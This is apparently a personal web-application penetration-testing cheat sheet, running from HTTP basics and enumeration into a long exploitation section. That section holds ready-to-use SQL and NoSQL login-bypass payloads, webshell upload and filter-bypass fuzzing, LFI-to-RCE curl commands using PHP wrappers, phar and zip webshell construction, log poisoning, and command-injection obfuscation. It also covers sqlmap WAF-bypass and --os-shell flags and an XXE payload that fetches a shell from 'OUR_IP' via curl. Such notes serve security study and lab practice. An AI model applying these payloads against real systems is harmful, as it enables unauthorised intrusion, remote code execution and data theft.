# Introduction

**Http Methods:**
- `GET`, `DELETE`, `HEAD`
	- `http://url.com?p1=v1&p2-v2
- `POST`, `PUT`, `PATCH` 
	- **Simple Form:** 

		If there is no `name=`, then the parameter cannot be changed in the request
	  - Request:
		  - `Content-Type: application/x-www-form-urlencoded`
			- Burp Request: at the bottom`p1=v1&p2=v2` 
			- Curl Request: `-d = "p1=v1&p2=v2"
		-  Response
			```
			<form action="[URL]" method="post">
			<input type="text" name="[p1]" placeholder="Name">
			<input type="email" name="[p2]" placeholder="Email">
			</form>
			```
	- **JSON Data (API):** 
	  - Request:
		  - `Content-Type: application/jason`
			- Burp Request: at the bottom `{"p1":"v1","p2":"v2"}`
			- Curl Request: `-d '{"p1":"v1","p2":"v2"}'`
		- Response:
			```
			<script>
			fetch('[URL]', {
			method: 'POST',
			headers: {
			'Content-Type': 'application/json'
			},
			body: JSON.stringify({ [p1]: '[v1]', [p2]: '[v2]' })
			});
			</script>
			```
	- **File upload:** 
	  - Request:
		  - `Content-Type: Multipart/form-data`. It splits the form data into parts, each with its own content type.
			- Burp: 
				- Define a boundary in the content-type header
				- `Content-Type: multipart/form-data; boundary=----Boundary`
				- The same boundary must be used in the body to separate parts.
				- Uploaded File:
				  ```
				   ----Boundary
				   Content-Disposition: form-data; name="file"; filename="file.txt"  
				   Content-Type: text/plain
				   [File content here]
				   ```
				- Text Field for Description
					```----Boundary
					Content-Disposition: form-data; name="description"  
					
					File upload example
					----Boundary--
					```
			- Curl: 
				- Uploaded File: `-F "file=@/path/to/file.txt"`
				- Metadata: `-F "description=File upload example"
	  - Response
	    ```
		<form action="[URL]" method="post" enctype="multipart/form-data">
		<input type="file" name="file">
		<input type="text" name="description" placeholder="Description">
		</form>
		```

# Enumeration

## Server Info

- `web_enum [URL]`
- Firefox Extensions:
  - Wappalyzer
  - RetireJS
- Page Content

  - Component Names / Versions

  - Open Source / Well-known Application

  - HTML Source / JS Files Data

## Crawling

- Burpsuite Default Crawler
- `crawl [URL]`
- Alive URLs / Parameters / Forms / User Functionalities
- JS Files
  - Credentials
  - Endpoints
  - Function Calls
  - Hostnames / Usernames

## Discovery

#### FFUF

```bash
GENERAL:
	-X POST -d 'PARAM1=value1&PARAM2=value2'	# POST
	-request req.txt --request-proto http		# From txt

FILTER OPTIONS:
	-fc              # HTTP status codes 
    -fl              # lines in response.
    -fr              # regexp (responde do not contain the words)
    -mr			     # regexp (responde contains the words)
    -fs              # response size. 
    -fw              # amount of words in response.
  
OUTPUT OPTIONS:
	-c				# colored
	-s				# Only results (silent)
```

**REMEMBER TO COPY THE REQUEST EXACTLY!** E.g. from `Burp`

### VHosts

- Purpose:

  A virtual host is a alternate, parallell hostname for your box that  allows your box to react differently depending on what alternate name  visitors aims at.  

- Types:

  - Name-based: relies solely on the `HTTP Host header` to distinguish between websites.
  - IP-based
  - Port-based

**Fuzzing** `vhost URL` &rarr; Do it recursively!

Add found subdomains to `/etc/hosts` and scan recursively

### Directories and files

Fuzzing: `dirfuzz [URL]`

**HTTP status code** 

-  `200`  request was successful
-  `403`  forbidden to access the resource from the origin IP
-  `301`  being redirected (not a failure case)

**Important files:**

- `.swp` *swap files:* 

  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.

  - `vim -r [swap file]` to read it
  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable

- `robots.txt`

  It instructs search engine web crawlers bots which resources can and cannot be accessed for indexing. 
  
  `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. 
  
  `Directives`: specific instructions to the user-agent. Common directives:
  
  - `Disallow`
  
    paths that the bot can't crawl.
  
  - `Allow`
  
    Permits the bot to crawl specific paths, even if in`Disallow`.
  
  - `Crawl-delay`
  
    Sets a delay (in sec) between successive requests to avoid overloading
  
  - `Sitemap`
  
    Provides the URL to an XML sitemap for more efficient crawling.
  
- `.well-known`

  It is a standardized directory, typically accessible in `/.well-known/` from the web server , that centralizes a website's critical metadata, including configuration files and information related to its services,  protocols, and security mechanisms. Some common URIs:

  - `security.txt`

    Contains contact information for security researchers to report vulnerabilities.

  - `change-password`

    Provides a standard URL for directing users to a password change page.

  - `openid-configuration`

    Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Interesting for *endpoint discovery*.

  - `assetlinks.json`

    Used for verifying ownership of digital assets (e.g. apps) associated with a domain.

  - `mta-sts.txt`

    Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.
  
- `/.git`

  Hashes of a git folder. To reconstruct it:

  ```bash
  git-dumper [URL] [OUTPUT DIR]
  ```

### Hidden parameters

1. Check for hidden parameters:

   `paramscan [URL]` 

2. Verify the behaviour with curl

3. Fuzz using `ffuf`: REMEMBER TO COPY THE REQUEST EXACTLY!

```bash
ffuf -X POST -d 'PARAM1=value1&PARAM2=value2'		#same as curl
```

There are different types of POST parameters formats, depending on the *content type*:

- `Content-Type: application/x-www-form-urlencoded` &rarr; `-d 'PARAM=value'`
- `Content-Type: application/json` &rarr; `-d "{'PARAM':'value'}"`
-  `Content-type: multipart/form-data`

## Login - Registration

### Login Bypass
#### SQL
- `sqlscan() [LOGIN_REQUEST.txt]`
- `[USER][PREFIX] or 1>0-- -`
- `[USER]" or "a"="a`
- `[USER]' or 'a"='a`
#### NoSQL
- `nosqlscan() [LOGIN_REQUEST.txt]`
- `[USER][PREFIX] || 1>0//`
- `[USER]" || "a"="a`
- `[USER]' || 'a"='a`

### Email validation
- LOCAL DOMAIN
	- Look for ways to read the email validation -> OSticket update ticket by sending an email

# Exploitation

## Server-side

**Test Files** to check if the vulnerability is there:

- Linux: `"/etc/passwd"`
- Windows file: `'file"///c:/windows/win.ini'`

### File Upload

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

#### Find Upload Directory

- Fuzz
- Use other vulnerabilities to find the upload files by reading the web application code (e.g. php filters)
- Force error messages
  - Upload a file with a name that already exists
  - Send two identical requests simultaneously
  - Upload a file with a very long name (e.g., 5,000 characters)
  - Windows specific:
    - Use reserved characters in the file name, such as `|`, `<`, `>`, `*`, or `?`
    - Usereserved names for the uploaded file name, like (`CON`, `COM1`, `LPT1`, or `NUL`)

#### Allowed file Abuse

- **Configuration Files**

  - [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache.htaccess) / [httpd.conf](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf)  → Apache
  - [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)            → ASP.NET
  - [package.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#configuration-files)          → NodeJS Packages
  - [composer.json](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#configuration-files)         → PHP Packages
  - [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py)
  - [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)

- **SVG**
  Note that sometimes SVG is not uploaded somehwere, but is rendered on the same page in real time. Use `CTRL+SHIFT+C` to see the output of the payload.
  - [SVG Exploitation](https://github.com/allanlw/svg-cheatsheet) → `Content-Type: image/svg+xml`
  - XXE
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "[XXE_PAYLOAD]"> ]>
    <svg>&xxe;</svg>
    ```
  - XSS (you need for somebody to click on the link of the image)
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">[JS_XSS_CODE]</script>
    </svg>
    ```

- **PNG / JPG / DJVU**
  - [ImageMagick 7.0.1-1](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) / [7.1.0-49 beta](https://github.com/kljunowsky/CVE-2022-44268)
  - [PNG / JPG Compression Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#picture-compression)

  - Metadata Injection: 
    Put a payload in a meta-tag of an image &rarr; [DJVU + EXIFTOOL RCE](https://github.com/LazyTitan33/ExifTool-DjVu-exploit)

    1. For XSS change Content-type: text\html

    2. Change the meta-TAG of an image:

       ```bash
       exiftool -[TAG]="[INJECTION/BACKEND/XSS]" file.png
       ```

       - The TAG can be e.g. `Comment`, `Artist`
- **PDF**
  - [XSS](https://medium.com/@katmaca2014/pdf-upload-leading-to-stored-xss-f712326705ee)
  - Dynamic Rendering → iFrame LFI / SSRF
- XML / HTML / MD / CSS
  - XSS
  - XXE
  - SSRF
  - LFI
  - [Jetty XML RCE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#jetty-rce)
- **ZIP / TAR / GZ**
  - [Exploitation](https://0xn3va.gitbook.io/cheat-sheets/web-application/file-upload-vulnerabilities#abuse-archives)
  - [ZIP Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#zip-archive) / RCE
- **.H5 Tensorflow Kera**
	- [RCE](https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model)

#### Webshell Upload

Bypass Client-Side Validation → Intercept Upload Request → Webshell in Multipart Data → Bypass Type & Extension Filters 

- **Front-end filter**

  - Use Burp, if you don't see the Burp request:

    - `CTRL+SHIFT+C` to toggle the Page Inspector

    - Click on the upload form &rarr; the html code will be highlighted

    - Set: 

      - `method="post"`

      -  `enctype="multipart/form-data"` 

      - `action="/[BACKEND_FILE]"` 
        Guess or fuzz the file that processes the upload
      
    - Use `Console` to debug and see error messages

  - Disable front-end validation
    - `CTRL+SHIFT+C` to toggle the Page Inspector
    - Click on the upload form &rarr; the html code will be highlighted
    - `CTRL+SHIFT+K` and type functions to examine the c

- **Back-end Filters**

  - MIME-Type 
    FUZZ followed by a shell in the content of the file
    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/mime-bytes.txt -s | head -n 1 > allowed_mime
    ```
  - Content-type: usually you can keep the Content-type of an allowed file
    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/content-types.txt:FUZZTYPE -w allowed_mime:FUZZMIME
    ```
  - Extension fuzzing (replace `png` with allowed extension)
    - `shell.pngFUZZEXT`
    - `shellFUZZEXT.png`
    - `shellFUZZEXT`
    ```bash
    ffuf -request req.txt --request-proto http -w /usr/share/wordlists/file_upload/ext_bypass.txt:FUZZEXT -w allowed_mime:FUZZMIME
    ```
  - See which shell worked:
    ```bash
    ffuf -u "http://[URL]/[UPLOADS_FOLDER]/shell.pngFUZZ?cmd=id" -w /usr/share/wordlists/file_upload/ext_bypass.txt -mr "uid" -s
    ```

#### Name Injection

Inject a command in the file name (if the name of the file is reflected or processed in the back-end)

- SQL / XSS / SSTI / SSRF / OS / LFI Injections 

#### Windows File Convention

Use the Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist:  they used a Tilde character (`~`) to complete the file name

-> we can write a file called (e.g. `WEB~.CONF`) to overwrite the `web.conf` file.

### LFI / RFI

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended, like when an application uses the path to a file as input. 

#### What to read 
Path wordlists:

[Linux](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt): `/usr/share/wordlists/LFI/file_inclusion_linux.txt`
- `/etc/passwd`, `/etc/shadow`
- ssh keys
- web applications credentials
  - where does the application save the passwords?
- New VHOSTS
- Web root: 
  `seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
- [Log files](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

[Windows](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt): `/usr/share/wordlists/LFI/file_inclusion_windows.txt`
- `WINDOWS\System32\drivers\etc\hosts`
-  `C:\Windows\boot.ini`
- New VHOSTS
- Web root:
  `seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`
- [Log files]([wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows))

Both:
- `/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`

Tools:
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
-  [liffy](https://github.com/mzfr/liffy)

#### White boxing
```bash
# PHP
grep -RHine 'include\(|include_once\(|require\(|require_once\(|file_get_contents\(|fopen\(|file\(' .

# NodeJS
grep -RHine 'fs\.readFile\(|fs\.sendFile\(|res\.render\(' .

# Java
grep -RHine 'include\>|import\>' .

# .NET
grep -RHine '@Html\.Partial\(|@Html\.RemotePartial\(|Response\.WriteFile\(|include\>' .
```

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | ---------------- | ----------- | -------------- |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` | ✅                | ✅           | ✅              |
| `require()`/`require_once()` | ✅                | ✅           | ❌              |
| `file_get_contents()`        | ✅                | ❌           | ✅              |
| `fopen()`/`file()`           | ✅                | ❌           | ❌              |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              | ✅                | ❌           | ❌              |
| `fs.sendFile()`              | ✅                | ❌           | ❌              |
| `res.render()`               | ✅                | ✅           | ❌              |
| **Java**                     |                  |             |                |
| `include`                    | ✅                | ❌           | ❌              |
| `import`                     | ✅                | ✅           | ✅              |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            | ✅                | ❌           | ❌              |
| `@Html.RemotePartial()`      | ✅                | ❌           | ✅              |
| `Response.WriteFile()`       | ✅                | ❌           | ❌              |
| `include`                    | ✅                | ✅           | ✅              |
##### include()
-> include in the parameter a command with `?cmd=id` and it will be executed
#### **Exploit:**
##### Path Traversal
-  `../../../../../etc/passwd`
- Bypasses: 
- `....//` `..././` `....\/` `....////`
- URL Encoding
- Fuzz approved path: `./[FUZZ]/../../../../../etc/passwd`
- Only some extensions are readable.
-  PHP version < 5.4
 - Path truncation: Reaching the 4096 character limitation, the appended extension (`.php`) would be truncated:
   ```bash
   echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
   ```
 - Null byte injection: add a null byte (`%00`) at the end
##### PHP Wrappers
Add the wrapper in the GET/POST parameter 
- Check `php.ini` file -> look for `allow_url_include`, `expect`
    - Apache: `/etc/php/[PHP VERSION]/apache2/php.ini`
    - Nginx: `/etc/php/[PHP VERSION]/fpm/php.ini`
    - Read `phpinfo.php` if possible
- **`filter`** -> source code disclosure (e.g. read upload folder)
  ```
  php://filter/read=convert.base64-encode/resource=[FILE_TO_READ]
	```
- **`data`** -> RCE (if `allow_url_include`)
  ```bash
  curl -s 'http://<URL>?PARAM=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
  ```
- **`input`** -> RCE in POST request (if `allow_url_include`)
	```bash
  curl -X POST --data "<?php echo shell_exec('id'); ?>" "http://example.com/index.php?page=php://input%00" -k -v
  ```
- **`expect`** -> RCE
  ```bash
  curl -s "http://<URL>/?[PARAM]=expect://id"
  ```
- **`ssh2`** -> RCE
  ```bash
  ssh2.exec://user:pass@example.com:22/[CMD]
	```
	- The domain is localhost if SSH is an internal port
- **`zip wrapper`** -> RCE if **images** can be uploaded:
	1. Create and zip a web shell
	   ```bash
	   echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
	   ```
	2. Upload `shell.jpg`
	3. Include it using the zip wrapper (check upload location)
	   ```
	   zip://[PATH]/shell.jpg%23shell.php&cmd=id
	   ```
	   `%23` is `#` in URL encoding
- **`phar`** -> RCE if **images** can be uploaded:
	1. Create a shell.php file
	   ```php
	   <?php
	   $phar = new Phar('shell.phar');
	   $phar->startBuffering();
	   $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
	   $phar->setStub('<?php __HALT_COMPILER(); ?>');
	   
	   $phar->stopBuffering();
	   ```
	2. Compile it in a phar file
	   ```bash
	   php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
	   ```
	3. Upload shell.jpg (check upload location)
	4. Include it with phar wrapper
	   ```
	   phar://[PATH]/shell.jpg%2Fshell.txt&cmd=id
	   ```

##### RFI

  To verify, try to include a URL (first a local one, but not the vulnerable page itself, since it could cause a loop), and see if we can get its content.
  `allow_url_include` has to be enabled, apart from SMB.
  1. Write a script in the language of the web application
  2. Host and include the script
     - http:
       ```bash
       sudo python3 -m http.server <LISTENING_PORT>	# 80 or 443
       ```
     - ftp:
       ```bash
       sudo python -m pyftpdlib -p 21
       ```
     - smb - doesn't require `allow_url_include`:
       ```
       smbserv
       ```

##### Log poisoning
  Requires execute privileges.
  Writing PHP code in a field gets logged into a log file (i.e. `poison`/`contaminate` the log file), and then include that log file to execute the PHP code.
  - PHP:
    `PHPSESSID` cookies, can hold specific user-related data on the back-end (`/var/lib/php/sessions/` on Linux and `C:\Windows\Temp\` on Windows).  if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its name would be `sess_el4ukv0kqbvoirg7nkp4dncpk3`
    1. Check if `PHPSESSID` cookie is set
    2. Try to include the `sess_*` file in the vulnerable parameter
    3. Check the `sess_*` file,  do you have control over a specified parameter? If so, try to change it to a string by sending another request, and check again if it changed
    4. Poisoning by writing PHP code into the session file
       ```bash
       http://<SERVER_IP>:<PORT>/index.php?[PARAM]=[SHELL]
       ```
       Don't use a non-permanent web shell, because with each command you would overwrite the `sess_*` file.
    5. Include the `sess_*` file by LFI
  - Apache & Nginx
    1. Look for `access.log` and `error.log` or others and try to read them
       - Apache: `/var/log/apache2/` `C:\xampp\apache\logs\`
       - Nginx: `/var/log/nginx/` `C:\nginx\log\`
       - Others for Linux: 
         - `/proc/self/environ`
         -  `/proc/self/fd/N` files (N is a PID usually between 0-50)
         - `/var/log/sshd.log`
         - `/var/log/mail`
         - `/var/log/vsftpd.log`
    1. Look for parameters (also the header) that you can control &rarr; poison
    2. Web shell in the parameter
  - Open Services
    If the `ssh`, `mail` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into  them and set the username to PHP code, and upon including their logs,  the PHP code would execute.

#### Network Combo
- **SMTP**
	- Send an email to a user with a php shell
	- read `/var/mail/[USER]` with `&cmd=id`

### OS Injection (command injection)

If in the backend, when you send a request though a parameter, this gets processed through a linux command, it could be vulnerable to executing multiple commands, like `&&` or `;`.

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space)

##### Tools

- **Linux**

  ```bash
  bashfuscator -c '[COMMAND]' -s 1 -t 1 --no-mangling --layers 1
  ```

- **Windows**

  [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)

  ```powershell
  Import-Module .\Invoke-DOSfuscation.psd1
  Invoke-DOSfuscation
  SET COMMAND [COMMAND]
  encoding
  1
  ```

  

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |                                    |                              |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ | ---------------------------------- | ---------------------------- |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |                                    |                              |
| New Line               | `\n`                    | `%0a`                     | Both                                       |                                    |                              |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |                                    |                              |
| Pipe                   | ` \| `                  | ` \| `                    | `%7c`                                      | Both (only second output is shown) |                              |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |                                    |                              |
| OR                     | `                       |                           | `                                          | `%7c%7c`                           | Second (only if first fails) |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |                                    |                              |

##### Filters

- **Characters**

  - Space:
    - Tab: `%09`
    - IFS Linux Variable has default value space+ tab: `${IFS}`
    - `Bash Brace Expansion` feature, which automatically adds spaces between arguments wrapped between braces, e.g. `{ls,-la}`
  - Linux slash `/`
    - Env variables: `${PATH:0:1}` same with `$HOME` or `$PWD`
  - Windows slash `\`
    - cmd: `%HOMEPATH:~6,-[USERNAME-LENGHT]%`
    - Powershell: `$env:HOMEPATH[0]`
  - Semi-colon `;`
    - Linux only: `${LS_COLORS:10:1}`

  - Character Shifting:

    1. ```bash
       man ascii	# Shows ascii table
       ```

    2. Spot the character you need and select the previous one

    3. `$(tr '!-}' '"-~'<<<[PREV_CHAR])`

- **Linux Commands**

  - single `'` or double `"` quotes, e.g. `w'h'o'am'i` (even number)

  - `\`

  - `$@`

  - Alternating cases (e.g. `WhOaMi`) or all capital (e.g. `WHOAMI`)

    ```bash
    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
    ```

  - Reverse letters (imaohw` instead of `whoami)

    ```bash
    $(rev<<<'imaohw')
    ```

  - Encoding `base64`, `xxd` (use `echo -n`)

    ```bash
    bash<<<$(base64 -d<<<[BASE64_COMMAND])
    ```

- **Windows Commands** 

  - single `'` or double `"` quotes, e.g. `w'h'o'am'i` (even number)

  - `^`

  - Alternating cases (e.g. `WhOaMi`) or all capital (e.g. `WHOAMI`)

  - Reverse letters (imaohw` instead of `whoami)

    ```powershell
    iex "$('imaohw'[-1..-20] -join '')"
    ```

  - Encoding

    ```bash
    echo -n whoami | iconv -f utf-8 -t utf-16le | base64
    ```

    ```powershell
    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('[BASE64_COMMAND]')))"
    ```


### SQL Injections

#### Enumeration
##### Injection types:
- **Union Based:** 
  - output readable on the front-end
  - specify location (i.e. column)
- **Error Based:** 
  - errors readable on the front-end
- **Boolean Based** (blind)
  - Boolean condition true &rarr; size or status change of HTML request
- **Time Based** (blind)
  - Boolean condition true &rarr; delay response with `Sleep()` &rarr; time change
  - e.g. `AND 1=IF(2>1,SLEEP(5),0)`
- **Stacked Queries**
  -  injecting additional SQL statements after the vulnerable one. 
  - e.g. `; DROP TABLE users`
- **Out of Band:**
  - output in a DNS record
#### sqlmap: 

- [Wiki & Usage](https://github.com/sqlmapproject/sqlmap/wiki/usage) 
- In Net Inspector: `Copy` > `Copy Request Headers`
- `sqlscan <query.txt>`

```bash
#-----------------------------GENERAL----------------------------------

# General query
sqlmap [CURL_QUERY]	/ -r [query.txt] 			# Test all parameters
sqlmap [CURL_QUERY] -p [PARAM_TO_TEST]
sqlmap [CURL_QUERY + APPEND * TO PARAM TO TEST]

# Header
-H='<HEADER_KEY>: <VALUE>'		# Header specification
--<header_key>='<value>'		# Add * to test for injection

# Good to have
--dump-all --exclude-sysdbs		# Automatically dump all the data
--flush-session --fresh-queries	# Clean prev sessions
--threads 10
-v 3

# DB Enumeration
--smart							# Runs euristics
--schema 						# Table structure
--search [ -T, -C] <string>		# search as LIKE operator in table, col
--dump -D <db> -T <table>		# Dump a table
--passwords						# Find credentials

# Payload tuning
--prefix= / --suffix=			# Boundaries of the payload
--level=<1-5 [d1]> 				# Extends payloads based on success prob
--risk=<1-3 [d1]>				# Extends payloads based on risk

--code=<status_code>			# Filter by status code of success
--titles=<http_title>
--string=<success_string>
--text-only 					# Comparison only on visible content
--technique=BEUSQT

-union-cols=<No.DB columns>		# For UNION Inj
--union-char='a'				# Value of the column (default NULL)
--union-from=<table>			# append in the form FROM <table>	

#-----------------------------BYPASS----------------------------------

# WAF bypass 
--skip-waf						# Skip WAF identification
--random-agent 					# random User-agent 
--mobile 						# Imitate a smartphone  
--tor --check-tor				# Tor proxy: sudo service tor start
--chunked						# Splits POST requests in chunks
--list-tampers					# Determine tamper with ~/TOOLS/ATLAS.py
--tamper=between,space2comment,equaltolike,escapequotes

# Debugging
--parse-errors						# Show DBMS errors
-t /tmp/traffic.txt					# Stores traffic content
--proxy	"http://127.0.0.1:9999"		# redirect to a proxy (Burp)

# Protections Bypass
--csrf-token="<param>"			# Against Cross-Site Request Forgery 
--randomize=<param>				# Param to randomize
--eval=<Py code with param>		# Dinamically computes value of param

#-----------------------------EXPLOIT----------------------------------
--privileges                    # Enumerate DB user privileges
# OS File read / write
--file-read "<path>"			# OS file read (saved in a file)
--file-write "<your_local_file>" --file-dest "<remote_path>"

# OS Command execution
--os-shell
```

##### WAF Bypass

- -> SQLmap WAS Bypass section
- Identify TAMPER:
	```bash
    python3 ~/TOOLS/atlas/atlas.py
    ```
- HPP (HTTP parameter pollution): split the payload for GET request

  e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...`

#### Manual
Relational database structure in the back-end (e.g. MySQL). *Relational databases* have data stored in tables and use SQL for queries

- Apache / Nginx on Linux -> likely `MySQL`
  - Identify with:
    - If you have full query output: `SELECT @@version` 
      In MSSQL it returns MSSQL version. Error with other DBMS.
    - Numeric output: `SELECT POW(1,1)`
      Error with other DBMS.
    - Blind: `SELECT SLEEP(5)`
      Will not delay response with other DBMS
  - Use `INFORMATION_SCHEMA` to get the structure of the database
    ```sql
    cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
    ```

    ```sql
    cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
    ```
    ```sql
    cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
    ```
- IIS -> Probably Windows -> likely `MSSQL`
##### MySQL
- **Boolean** -> Login Bypass
	- `OR 1=1`
	- `OR 1>0`
	- `OR 1 LIKE 1`
- **Union Query**
  - `UNION` merges the columns of two tables (use junk variables to match the number of columns)
	   ```sql
		cn' UNION select 1,@@version,3,4--
		```
	-  `ORDER BY FUZZN` -> Discover the number of columns
	    - wordlist: `/usr/share/wordlists/numbers1-20.txt:FUZZN`
-  **Sleep query:** 
    - MSSQL: `OR WAITFOR DELAY '0:0:10'`
	- PSQL: `OR SELECT pg_sleep(10)`
	- MYSQL: `OR SELECT sleep(10)`
	- ORACLE: `OR dbms_pipe.receive_message(('a'),10)`
- **Prefix and Suffices:**
	```bash
	ffuf -u [URL] param=[WorkingParam][Payload] -w /usr/share/wordlists/sql_prefix.txt:FUZZ1 -w /usr/share/wordlists/sql_suff.txt:FUZZ2
	```
- **Read / Write Files:**
	- Determine User
		```sql
		SELECT USER()
		SELECT CURRENT_USER()
		SELECT user from mysql.user
		```
	- Determine r/w privileges (`FILE` privilege)
		```sql
		cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
		```
	- Check where to r/w from (empty = anywere; NULL = nowhere)
		```sql
		SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
		```
  - Read
    ```sql
    SELECT LOAD_FILE('/etc/passwd');
    ```
    Read the server configuration to discover the **web root** (to upload a shell)
    - Apache: `/etc/apache2/sites-enabled/000-default.conf`

  - Write in the back-end
    ```sql
    SELECT * from tabl INTO OUTFILE 'PATH'; 	# From Table
    SELECT 'string' INTO OUTFILE 'PATH';		# From string
    # If used with union do select 1, 2, 'string', ...
    ```
    - Use `FROM_BASE64("base64_data")` to write long files
    
### SSRF
When there is a URL form, try to put you IP address and see if there is contact by opening a listener of the 80 port.
Allows to send htpp request from the point of view of the server

1. Test:
	1. Open a http server
	2. Send a request to your IP
	3. See if connects
2. Test the file protocol to ckeck if it blind or not
	1. `file:///etc/passwd`
	2. Not blind -> arbitrary file read
3. Look for internal http open ports
	1. Try `127.0.0.1` and hidden ports
	2. Fuzz for ports 
	3. Fuzz for Internal IPs
4. Abuse different protocols
	1. ftp
	2. smtp
	3. gofer -> gofer injection

#### NoSQL
##### Sintax Injection
- Try to add `'` to see changes in the response
- Boolean Injection -> Login Bypass: `'||'1'=='1`

##### Operator Injection
- Detection:
	1. Try `username[$ne]=admin&password[$ne]=admin`
	2. If it doesn't work:
	3. Convert the request to `POST` and`Content-Type` to `application/json`.
	4. Try the first account returned by the query: 
	   `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
	5. Target a specific account:
	   `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
- Timed based Injections
### XXE Injection

*XML Entities* are a way of representing an item of data within an XML
document (markup language), instead of using the data itself. E.g., `&lt;` and `&gt;` represent < and > .

#### **Confirmation**

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [
	<!ENTITY hello "Hello">
]>
<data>&hello;</data>
```

- data: vulnerable parameter, the *reflected* one.
- If the `DOCTYPE` was already declared, just add the `ENTITY`.
- If vulnerable, it would print "Hello"

#### Exploits

- **`php` application**
  - File read -> Try different php wrappers
    ```xml
    <!ENTITY hello SYSTEM "php://filter/convert.base64-encode/resource=index.php">
    ```
  - Command execution (if reflected, and the filter is installed)
    1. Execute basic commands
       ```xml
       <!ENTITY hello SYSTEM "php://expect://id">
       ```
    2. Gain a shell:
       3. Write a web shell, and open a server
       4. Upload the shell on the web server with `expect`
          ```xml
          <!ENTITY hello SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
          ```
       5. Interact
